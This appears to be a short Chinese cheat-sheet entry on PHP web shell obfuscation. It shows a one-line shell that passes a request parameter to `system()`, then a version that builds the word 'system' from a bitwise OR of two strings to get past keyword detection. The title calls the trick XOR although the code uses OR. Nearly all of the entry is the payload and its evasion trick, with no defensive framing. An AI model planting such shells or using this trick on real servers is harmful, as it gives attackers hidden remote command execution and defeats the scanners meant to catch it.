# PHP XOR

简介：利用逻辑运算生成关键词来替换敏感关键词，绕过关键词检测

例：
```php
<?php system($GET['c']);?>
```
可替换为：
```php
<?php ('!!!0!!'|'RXRDDL')($GET['c']);?>
```
